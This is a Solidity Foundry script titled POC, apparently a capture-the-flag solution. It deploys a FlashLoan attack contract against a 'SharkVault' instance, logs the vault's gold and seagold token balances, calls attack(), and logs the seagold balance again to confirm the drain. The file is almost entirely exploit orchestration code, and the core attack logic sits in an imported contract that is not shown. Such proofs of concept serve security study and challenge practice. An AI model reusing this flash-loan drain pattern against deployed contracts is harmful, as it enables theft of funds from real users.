// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";



import {SharkVault, IERC20, FlashLoan} from "../Src/Contracts/FlashLoan.sol";

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address INSTANCE = vm.envAddress("INSTANCE");
        address FLASH_LENDER = vm.envAddress("FLASH_LENDER");
        address REGISTRY = vm.envAddress("ERC1820REGISTRY");

        vm.startBroadcast(deployerPrivateKey);

        SharkVault vault = SharkVault(INSTANCE);

        IERC20 gold = IERC20(vault.gold());
        IERC20 seagold = IERC20(vault.seagold());

        FlashLoan flashLoan = new FlashLoan(FLASH_LENDER, address(gold), address(seagold), address(vault), REGISTRY);

        console.logAddress(address(gold));
        console.logAddress(address(seagold));
        console.logUint(gold.balanceOf(address(vault)));
        console.logUint(seagold.balanceOf(address(vault)));

        flashLoan.attack();

        console.logUint(seagold.balanceOf(address(vault)));

        vm.stopBroadcast();
    }
}